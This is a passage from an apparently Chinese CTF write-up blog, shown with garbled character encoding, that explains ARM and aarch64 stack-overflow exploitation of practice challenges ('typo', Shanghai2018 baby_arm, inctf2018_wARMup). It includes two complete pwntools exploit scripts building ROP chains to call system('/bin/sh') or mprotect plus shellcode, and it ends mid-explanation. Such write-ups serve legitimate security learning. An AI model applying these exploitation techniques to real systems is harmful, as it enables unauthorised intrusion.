æ­¤èƒ½è®©è¿™ä¸ªcontinueåœä¸‹çš„åŠæ³•å°±æ˜¯ç¢°åˆ°è¾“å…¥å‡½æ•°</strong>ï¼ˆè¿™ä¸€æ‹›ç¡®å®å¦™å•Šï¼‰ã€‚</p><p><img src="/../img/2706180-20220330143659812-841662687.png"></p><p>æˆ‘ä»¬ç¬¬ä¸€æ¬¡å…ˆè¾“å…¥ä¸€ä¸ªå›è½¦</p><h3 id="æ’å…¥ä¸€ç‚¹ï¼šå¦‚æœä¸è¾“å…¥å›è½¦å‘¢ï¼Ÿ"><a href="#æ’å…¥ä¸€ç‚¹ï¼šå¦‚æœä¸è¾“å…¥å›è½¦å‘¢ï¼Ÿ" class="headerlink" title="æ’å…¥ä¸€ç‚¹ï¼šå¦‚æœä¸è¾“å…¥å›è½¦å‘¢ï¼Ÿ"></a>æ’å…¥ä¸€ç‚¹ï¼šå¦‚æœä¸è¾“å…¥å›è½¦å‘¢ï¼Ÿ</h3><p>ä¸è¾“å…¥å›è½¦ï¼Œå»è¾“å…¥åˆ«çš„å†…å®¹çš„è¯ï¼Œç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸¢å¼ƒç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä»è€ŒæŠŠåé¢çš„å†…å®¹å»å½“åšå‘½ä»¤å¤„ç†ã€‚<br><img src="/../img/2706180-20220330143706504-722501017.png"></p><p>å¯ä»¥å‘ç°ç¬¬ä¸€æ¬¡è¾“å…¥äº†ä¸ªkkkkkkkkkï¼Œç»“æœæŠ¥äº†ä¸€ä¸ªcommand not foundã€‚é‚£å°±è¯´æ˜è¿™ä¸ªç¨‹åºè¯•å›¾å°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å½“åšå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/../img/2706180-20220330143715763-1494112878.png"></p><p>å¯æ˜¯æˆ‘ä»¬è¾“å…¥lsçš„è¯ï¼Œå®ƒè¯´sè¿™ä¸ªå‘½ä»¤æ²¡æœ‰è¢«æ‰§è¡Œï¼Œç”±æ­¤çŒœæµ‹ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦è¢«ä¸¢å¼ƒäº†ã€‚</p><p><img src="/../img/2706180-20220330143723931-1908764069.png"></p><p>ç»“åˆä¸Šå›¾å‘ç°ï¼Œäº‹å®ç¡®å®å¦‚æ­¤ï¼Œå¯æ˜¯è¿™æ ·å°±å‘ç°æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å½“åšæŒ‡ä»¤æ‰§è¡Œçš„è¯ï¼Œç¨‹åºå°±ç»“æŸäº†ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•åªè¾“å…¥ä¸€ä¸ªå›è½¦çœ‹çœ‹ä¼šæ€ä¹ˆæ ·ï¼Ÿ</p><p><img src="/../img/2706180-20220330143730693-1862644172.png"></p><p>ç¨‹åºå¼€å§‹ç»§ç»­è¿è¡Œäº†ã€‚è€Œä¸”å€¼å¾—ä¸€æçš„æ˜¯ï¼Œäººå®¶è‹±è¯­ä¹Ÿè¯´äº†ï¼ŒæŒ‰ä¸‹å›è½¦é”®å°±ä¼šå¼€å§‹ã€‚</p><p>ç»§ç»­å›å½’æ­£é¢˜</p><p>æ€ä¹ˆå»ç¡®å®šåç§»é‡ï¼Ÿæˆ‘ä»¬é‡‡ç”¨cyclicå»ç¡®å®šè¾“å…¥ç‚¹è·ç¦»è¿”å›åœ°å€çš„åç§»ã€‚</p><p><img src="/../img/2706180-20220330143740365-728718642.png"></p><p>ç”¨cyclicå¡«å……ä¸¤ç™¾ä¸ªå­—ç¬¦ï¼Œç„¶åç”¨cyclic -lå¾—åˆ°åç§»ã€‚</p><p><img src="/../img/2706180-20220330143748777-307977432.png"></p><p>å› ä¸ºè¿™æ˜¯é™æ€é“¾æ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å»é‡Œé¢æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„&#x2F;bin&#x2F;shå‚æ•°å’Œsystemå‡½æ•°ã€‚</p><p>äº‹å®ä¸Šæˆ‘ä»¬æ²¡æœ‰åŠæ³•æœåˆ°systemå‡½æ•°ï¼Œä½†æ˜¯çŒœæµ‹ä¸€ä¸‹ï¼Œsystemä¼šè°ƒç”¨&#x2F;bin&#x2F;shï¼Œå› æ­¤æˆ‘ä»¬å…ˆå»æ‰¾ä¸€ä¸‹&#x2F;bin&#x2F;sh</p><p><img src="/../img/2706180-20220330143816463-469510505.png"><br><img src="/../img/2706180-20220330143825159-977323706.png"></p><p><strong>å¦‚æœä½ çš„IDAæ²¡æœ‰å‡ºç°ä¸Šé¢çº¢æ¡†é‡Œé¢çš„å†…å®¹ï¼Œå°±è¯´æ˜IDAè¿˜æ²¡æœ‰æŠŠæ‰€æœ‰çš„æ•°æ®è£…è½½å®Œï¼Œç­‰ä¸€ä¼šå°±è¡Œäº†ã€‚</strong></p><p>ç„¶åç‚¹ä¸Šé¢çº¢è‰²æ¡†è·³è½¬è¿‡æ¥ï¼Œå°±æ˜¯è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="/../img/2706180-20220330143834126-1105741162.png"></p><p>è™½ç„¶æˆ‘çœ‹ä¸å‡ºæ¥ä»–æ˜¯ä¸ªsystemå‡½æ•°ï¼Œä½†æ˜¯æœ‰å…³ç³»å˜›ï¼Ÿæ²¡æœ‰å…³ç³»ã€‚å¦‚æ­¤ï¼Œsystemå‡½æ•°çš„åœ°å€å°±æ˜¯ 0x10ba8</p><p><img src="/../img/2706180-20220330143844765-114030552.png"></p><h2 id="armæ¶æ„çš„åŸºæœ¬çŸ¥è¯†"><a href="#armæ¶æ„çš„åŸºæœ¬çŸ¥è¯†" class="headerlink" title="armæ¶æ„çš„åŸºæœ¬çŸ¥è¯†"></a>armæ¶æ„çš„åŸºæœ¬çŸ¥è¯†</h2><h3 id="arm32ä½"><a href="#arm32ä½" class="headerlink" title="arm32ä½"></a>arm32ä½</h3><p>è¿™ä¸ªarm32ä½çš„è¯ï¼Œ<strong>ä¼ å‰å››ä¸ªå‚æ•°æ˜¯ç”¨çš„r0~r3å¯„å­˜å™¨</strong>ï¼Œå¦‚æœ<strong>å‚æ•°å†å¤šçš„è¯ï¼Œå°±åˆ©ç”¨æ ˆä¼ å‚</strong>ï¼ˆä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼‰ã€‚<strong>å‡½æ•°çš„è¿”å›å€¼ä¼šå­˜åœ¨r0å¯„å­˜å™¨</strong>ä¸­ã€‚ç„¶å<strong>pcå¯„å­˜å™¨å°±ç›¸å½“äºx86ä¸­çš„eipå¯„å­˜å™¨</strong>ï¼ˆå§‹ç»ˆè£…çš„éƒ½æ˜¯æˆ‘ä»¬ä¸‹ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œçš„åœ°å€ï¼‰é™¤æ­¤ä¹‹å¤–ï¼Œ<strong>arm çš„ b&#x2F;bl ç­‰æŒ‡ä»¤å®ç°è·³è½¬</strong>ã€‚</p><p>å› æ­¤æˆ‘ä»¬å°±å…ˆå»çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥æ§åˆ¶r0å¯„å­˜å™¨çš„gadgetã€‚</p><p><img src="/../img/2706180-20220330143857152-1288308186.png"></p><p>è¿™ä¸ªpop r0 r4 pcå°±å¾ˆniceã€‚</p><p>r4æˆ‘ä»¬éšä¾¿å¡«å……ï¼Œpcä½ å¯ä»¥ç†è§£ä¸ºretçš„æ•ˆæœã€‚ç„¶åpayloadæ ¼å¼è·Ÿx86çš„å·®ä¸å¤šã€‚</p><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./typo&#x27;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()                 </span><br></pre></td></tr></table></figure><h1 id="Shanghai2018-â€“-baby-arm"><a href="#Shanghai2018-â€“-baby-arm" class="headerlink" title="Shanghai2018 â€“ baby_arm"></a>Shanghai2018 â€“ baby_arm</h1><h2 id="æ€»ç»“ï¼š-1"><a href="#æ€»ç»“ï¼š-1" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€è¿™é“é¢˜ä¹Ÿç®—æ˜¯å­¦ä¹ äº†arrch64æ¶æ„ä¸‹çš„ret2csuï¼Œä¸x86ä¸­çš„åŒºåˆ«å…¶å®å¹¶ä¸å¤§ã€‚</p><p>2ã€mprotectå‡½æ•°å»ä¿®æ”¹å†…å­˜å±æ€§ï¼Œä»è€Œæ‰§è¡Œshellcode</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220330143907318-655446132.png"></p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220330143915394-2016812350.png"></p><p>ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œreadä¸€æ¬¡è¾“å…¥ï¼Œè¾“å…¥åˆ°bssæ®µï¼Œæ²¡æ³•æº¢å‡ºã€‚ç„¶åsub_4007F0å‡½æ•°ä¹Ÿæœ‰ä¸€æ¬¡è¾“å…¥ï¼Œè¾“å…¥åˆ°æ ˆé‡Œï¼Œå­˜åœ¨æº¢å‡ºã€‚</p><p><img src="/../img/2706180-20220330143923115-1537780362.png"></p><p>åŒæ—¶ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªmprotectå‡½æ•°ã€‚</p><h2 id="è§£é¢˜è¿‡ç¨‹ï¼š"><a href="#è§£é¢˜è¿‡ç¨‹ï¼š" class="headerlink" title="è§£é¢˜è¿‡ç¨‹ï¼š"></a>è§£é¢˜è¿‡ç¨‹ï¼š</h2><h3 id="åŠ«æŒæ‰§è¡Œæµ"><a href="#åŠ«æŒæ‰§è¡Œæµ" class="headerlink" title="åŠ«æŒæ‰§è¡Œæµ"></a>åŠ«æŒæ‰§è¡Œæµ</h3><p>è¿™é“é¢˜å‘ç°åœ¨ç¬¬äºŒä¸ªreadç»“æŸåï¼Œæˆ‘ä»¬çš„æ•°æ®å¹¶ä¸èƒ½è¦†ç›–è¿”å›åœ°å€ï¼ˆæ­¤æ—¶è¿”å›åœ°å€åœ¨æˆ‘ä»¬è¾“å…¥æ•°æ®çš„ä¸Šé¢ï¼‰ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220330143934847-349157649.png"></p><p>ä¸è¿‡æˆ‘ä»¬å‘ç°åœ¨0x400860çš„åœ°æ–¹è¿˜æœ‰ä¸€ä¸ªretï¼Œæˆ‘ä»¬å•æ­¥åˆ°è¿™ä¸ªretçœ‹çœ‹ï¼Œæ­¤æ—¶çš„x30æ˜¯ä»€ä¹ˆã€‚</p><p><img src="/../img/2706180-20220330143941968-684243399.png"></p><p>å¯ä»¥å‘ç°æ­¤æ—¶çš„x30ï¼Œå°±æ˜¯è·ç¦»æ ˆé¡¶ä¸º2çš„å†…å®¹ï¼Œè€Œè¿™ä¸ªå†…å®¹å¯¹åº”çš„æ ˆåœ°å€0x40007fffb8åˆ™æ˜¯åœ¨æˆ‘ä»¬ç¬¬äºŒæ¬¡readè¾“å…¥çš„èµ·å§‹åœ°å€ä¸‹é¢ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€ï¼Œä»è€Œæ¥åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµã€‚</p><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu?"></a>ret2csu?</h3><p>ç”±äºmprotectå‡½æ•°å¯ä»¥æ”¹å˜å†…å­˜çš„å±æ€§ï¼Œæœ¬æ¥è¿™é“é¢˜æ˜¯bssæ®µæ˜¯åªèƒ½å†™çš„ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ç”¨mprotectå°†bssæ®µå˜æˆå¯æ‰§è¡Œï¼Œç„¶åå¾€é‡Œé¢è¾“å…¥ä¸ªshellcodeå°±okäº†ã€‚æ€ä¹ˆæ§åˆ¶mprotectçš„å‚æ•°ï¼Ÿ</p><p>æˆ‘ä»¬å‘ç°ï¼Œarmæ¶æ„ä¸‹ï¼Œä¹Ÿæœ‰ä¸€æ®µæ±‡ç¼–å¯ä»¥æ§åˆ¶å¯„å­˜å™¨å‚æ•°ï¼ˆå®Œå…¨å¯ä»¥æŠŠè¿™æ®µå½“æˆx86ä¸­çš„csuï¼‰</p><p><img src="/../img/2706180-20220330143950123-1357024283.png"></p><p>å…ˆåˆ†æä¸‹é¢çš„loc_4008ccçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¥è¿™ä¸ªLDP         X19, X20, [SP,#var_s10]å°±æ˜¯è¯´å°†SP+0x10æ‰€æŒ‡å‘çš„å†…å®¹ç»™x19å’Œx20å¯„å­˜å™¨ï¼ˆx19å¯„å­˜å™¨æ‹¿çš„æ˜¯SP+0x10æ‰€æŒ‡å‘çš„å†…å®¹ï¼Œè€Œx20å¯„å­˜å™¨æ‹¿çš„æ˜¯SP+0x18æ‰€æŒ‡å‘çš„å†…å®¹ï¼‰</p><p>ç„¶åç¬¬å››å¥è¿™ä¸ªLDP         X29, X30, [SP+var_s0],#0x40çš„æ„æ€æ˜¯å°†SPæ‰€æŒ‡å‘çš„å†…å®¹ç»™x29å’Œx30å¯„å­˜å™¨ï¼ˆx29å¯„å­˜å™¨æ‹¿çš„æ˜¯SPæ‰€æŒ‡å‘çš„å†…å®¹ï¼Œè€Œx30å¯„å­˜å™¨æ‹¿çš„æ˜¯SP+0x8æ‰€æŒ‡å‘çš„å†…å®¹ï¼‰ï¼Œå®Œæˆè¿™å¥æŒ‡ä»¤ä¹‹åï¼Œå†å°†SPæŒ‡é’ˆå¢åŠ 0x40ä¸ªå­—èŠ‚ã€‚</p><p>ç„¶åretï¼Œè¿™ä¸ªå°±æ˜¯è¿”å›åˆ°x30å¯„å­˜å™¨æ‰€å­˜å‚¨çš„å€¼ã€‚</p><p>å†ç»“åˆç€åˆšåˆšåˆ†æçš„å†…å®¹ï¼Œæ¥çœ‹ä¸€ä¸‹loc_4008acçš„å†…å®¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¥å°±æ˜¯è¯´å°†x19çš„å€¼é€»è¾‘å·¦ç§»3ä½ï¼Œç„¶ååŠ ä¸Šx21çš„å€¼ï¼Œå°†å¾—åˆ°çš„è¿™ä¸ªå€¼æ‰€æŒ‡å‘å†…å®¹ç»™x3å¯„å­˜å™¨ã€‚ï¼ˆå¦‚æœæˆ‘ä»¬æ§åˆ¶x19çš„å€¼ä¸º0çš„è¯ï¼Œå°±æ˜¯è¯´æŠŠx21å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„å†…å®¹ç»™x3å¯„å­˜å™¨ã€‚</p><p>ç„¶åå‰©ä¸‹çš„movï¼Œaddå°±æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ã€‚</p><p>å€’æ•°ç¬¬ä¸‰è¡ŒBLRæŒ‡ä»¤æ˜¯å»è·³è½¬åˆ°X3å¯„å­˜å™¨çš„å€¼ï¼ŒåŒæ—¶æŠŠä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„åœ°å€å­˜åˆ°x30é‡Œé¢ã€‚</p><p>ç„¶åä¸‹é¢çš„CMPå’Œx86é‡Œé¢çš„ä¸€æ ·äº†ã€‚</p><p>å¦‚æ­¤æ€è·¯å°±å‡ºæ¥äº†ï¼Œå‡ ä¹æ˜¯è·Ÿret2csuçš„åˆ©ç”¨æ–¹æ³•ä¸€æ ·ã€‚æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚ç¬¬ä¸€ç‚¹å°±æ˜¯loc_4008ccä¸­çš„</p><p>LDP             X29, X30, [SP+var_s0],#0x40    è¿™ä¸ªæŒ‡ä»¤ï¼Œè™½ç„¶<strong>å®ƒæ˜¯åœ¨è¿™ä¸ªloc_4008ccå‡½æ•°çš„æœ€åï¼Œä½†æ˜¯å®ƒä¼ ç»™x29å’Œx30å¯„å­˜å™¨çš„æ—¶å€™ï¼Œæ‹¿çš„æ˜¯æ ˆé¡¶çš„å€¼ã€‚å› æ­¤å¸ƒç½®æ ˆä¸­æ•°æ®çš„æ—¶å€™ï¼Œæ ˆé¡¶çš„å†…å®¹åº”è¯¥æ˜¯å­˜æ”¾çš„x29å’Œx30çš„å€¼ã€‚</strong></p><p>ç¬¬äºŒç‚¹ï¼Œ<strong>æ˜¯BLR X3çš„æ—¶å€™ï¼Œè¿™ä¸ªX3çš„å€¼æº¯æºä¸€ä¸‹ï¼Œå®ƒæ˜¯ç”±X21å……å½“æŒ‡é’ˆæ¥æŒ‡å‘çš„ï¼Œè€ŒX21çš„å€¼åˆæ˜¯SP+0x20å……å½“æŒ‡é’ˆæ¥æŒ‡å‘çš„ã€‚æ„æ€å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æœ€ç»ˆæƒ³è·³è½¬çš„å†…å®¹å¿…é¡»è¢«æŒ‡é’ˆçš„æŒ‡é’ˆæ‰€æŒ‡å‘ï¼Œå› æ­¤è€ƒè™‘çš„æ˜¯å°†X3çš„å†…å®¹æ”¾åœ¨bssæ®µï¼Œç„¶åX21å»å­˜å‚¨bssæ®µçš„åœ°å€ï¼ˆæŒ‡å‘X3çš„å†…å®¹ï¼‰ï¼Œç„¶åå†æŠŠX21çš„å€¼å¸ƒç½®åœ¨æ ˆé‡Œé¢</strong>ã€‚æœ€åX3çš„å€¼æ”¾å…¥mprotectçš„pltåœ°å€å³å¯ï¼ˆ<strong>å› ä¸ºBLRè·³çš„è¯ï¼Œç›´æ¥è·³åˆ°äº†å¯„å­˜å™¨çš„å€¼å¤„ï¼Œå› æ­¤è¿™é‡Œåº”è¯¥æ”¾çš„æ˜¯pltåœ°å€ï¼ˆè¦æ±‚è¿™ä¸ªåœ°å€è£…çš„å°±æ˜¯æŒ‡ä»¤ï¼‰</strong>ï¼Œgotåœ°å€ï¼ˆè£…çš„æ˜¯gotè¡¨ï¼Œè€Œgotè¡¨ä¸­è£…çš„æ‰æ˜¯æŒ‡ä»¤ï¼‰æ˜¯ç”¨äºæŒ‡é’ˆå¯»å€è·³è½¬çš„æƒ…å†µï¼Œå½“æ—¶åœ¨è¿™é‡Œè¿·äº†ä¸€ä¸‹ï¼‰ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26705</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./zhengchang&#x27;</span>)</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode+=p64(mprotect_plt)</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line">payload2=offset*<span class="string">&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(bss_addr+<span class="number">0x100</span>)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  åˆ†åˆ«èµ‹å€¼ç»™äº†x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  åˆ†åˆ«èµ‹å€¼ç»™äº†x1 w0</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h1><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€armæ¶æ„ï¼ˆ32ä½ï¼‰çš„bssæ®µæ˜¯å¯æ‰§è¡Œçš„ï¼</p><p>2ã€è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯æ ˆè¿ç§»ï¼Œä»¥åŠé€šè¿‡è°ƒè¯•æ¥ç¡®å®špayloadçš„å¸ƒå±€ã€‚è¿™é“é¢˜æ˜¯æ¯”è¾ƒé”»ç‚¼è°ƒè¯•èƒ½åŠ›çš„ï¼ˆè‡³å°‘å¯¹äºç°åœ¨çš„æˆ‘æ¥è¯´ï¼‰ï¼Œé”»ç‚¼è°ƒè¯•èƒ½åŠ›ï¼Œæˆ‘æŒ‡çš„æ˜¯ä¸çœ‹expçš„æƒ…å†µä¸‹ï¼Œè‡ªå·±åšè¿™é“é¢˜â€¦</p><p>3ã€ç°åœ¨ä¹Ÿåšäº†ä¸‰é“armæ¶æ„çš„é¢˜äº†ï¼Œè¯´å®è¯å’Œx86ä¸‹çš„åŒºåˆ«ä¸å¤§ã€‚åªè¦ç†Ÿæ‚‰x86çš„åšé¢˜æ€è·¯ï¼Œåšè¿™ç§é¢˜ï¼Œåº”è¯¥å¾ˆå¿«å°±èƒ½é€‚åº”ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220330144006717-745739803.png"></p><h2 id="ç¨‹åºåˆ†æï¼š-1"><a href="#ç¨‹åºåˆ†æï¼š-1" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220330144021409-2027396437.png"></p><p>å­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯å¯æº¢å‡ºçš„å­—èŠ‚å¾ˆå°‘ï¼Œå› æ­¤è€ƒè™‘æ ˆè¿ç§»ã€‚ä¸”æ²¡æœ‰åé—¨å‡½æ•°</p><p><strong>è¿™é“é¢˜æˆ‘æœ‰çš„åœ°æ–¹å†™çš„æ˜¯R11ï¼ˆæ˜¯å› ä¸ºIDAä¸Šçœ‹æ˜¯R11ï¼‰ï¼Œæœ‰çš„åœ°æ–¹å†™çš„fpï¼ˆå› ä¸ºgdbé‡Œçœ‹çš„æ˜¯fp)ï¼Œå®é™…ä¸Šè¿™ä¿©å°±æ˜¯ä¸€ä¸ªä¸œè¥¿ã€‚</strong></p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p>æ ˆè¿ç§»çš„è¯ï¼Œè€ƒè™‘è¿ç§»åˆ°BSSæ®µï¼ŒåŒæ—¶è§‚å¯Ÿæ±‡ç¼–ï¼Œå‘ç°readçš„ç¬¬äºŒä¸ªå‚æ•°ï¼ˆå³è¾“å…¥çš„åœ°å€ï¼‰æ˜¯ç”±R3ä¼ é€’çš„ï¼Œè€ŒR3çš„å€¼æ˜¯ç”±R11æ¥ä¼ é€’çš„</p><p><img src="/../img/2706180-20220330144030365-98591889.png"></p><p>åŒæ—¶åœ¨æœ€åï¼Œåˆæœ‰ä¸€ä¸ªpopæŒ‡ä»¤æ¥æ§åˆ¶R11å’ŒPCï¼Œå› æ­¤æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶R11ï¼ˆä¹Ÿå°±æ˜¯readçš„ç¬¬äºŒä¸ªå‚æ•°)å’Œç¨‹åºæ‰§è¡Œæµçš„ï¼ˆPCï¼‰</p><p><img src="/../img/2706180-20220330144038604-1618653163.png"></p><p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œè¿™ä¸ªfpè·ç¦»æˆ‘ä»¬è¾“å…¥èµ·å§‹çš„åœ°å€åç§»ä¸º100,è¿™å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦å¡«å……100ä¸ªåƒåœ¾æ•°æ®ï¼Œç„¶åæ¥æ§åˆ¶fpä»¥åŠpcã€‚</p><p>å› æ­¤ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ—¶å€™ï¼Œæ§åˆ¶fpï¼Œè®©å…¶ä¸ºbssæ®µåœ°å€ï¼ˆè¿ç§»çš„æ—¶å€™bssæ®µå°½é‡æŠ¬é«˜ï¼‰ï¼Œç„¶åå°†è¿”å›åœ°å€readåœ°å€ï¼Œå†è·‘ä¸€æ¬¡ï¼Œè®©æˆ‘ä»¬çš„ç¬¬äºŒæ¬¡payloadè¾“å…¥åˆ°bssæ®µã€‚</p><p><strong>armæ¶æ„ï¼ˆ32ä½ï¼‰çš„bssæ®µæ˜¯å¯æ‰§è¡Œçš„ï¼Œå°½ç®¡ç”¨vmmapçœ‹çš„æ˜¯å¯å†™ä¸å¯æ‰§è¡Œï¼ˆä½†æ˜¯å¸ƒç½®è¿›å»çš„shellcodeç¡®å®å¯ä»¥æ‰§è¡Œï¼‰</strong></p><p>å› æ­¤æˆ‘ä»¬å°±è¦æŠŠshellcodeå¸ƒç½®åœ¨bssæ®µã€‚è¿™é“é¢˜æ˜¯ååˆ†é”»ç‚¼è‡ªä¸»çš„è°ƒè¯•èƒ½åŠ›çš„ï¼Œå¯ä»¥çœ‹è§æˆ‘çš„expæ˜¯åœ¨shellcodeå‰é¢å¸ƒç½®äº†ä¸¤ä¸ªå†…å®¹ï¼Œè¿™é‡Œæˆ‘å¹¶ä¸æƒ³è§£é‡ŠåŸå› ã€‚æœ€å¼€å§‹æˆ‘è‡ªå·±åšè¿™é“é¢˜çš„æ—¶å€™å¹¶æ²¡æœ‰å†™è¿™ä¸¤ä¸ªå†…å®¹ï¼Œå½“æ—¶æˆ‘è®¤ä¸ºç›´æ¥æŠŠbssæ®µå†™shellcodeå°±è¡Œï¼Œç„¶åæ§åˆ¶PCæŒ‡é’ˆæ‰§è¡Œè¿‡å»ï¼Œ<strong>äº‹å®ä¸Šè¿™æ ·åšæ˜¯é”™è¯¯çš„</strong>ã€‚åŸå› 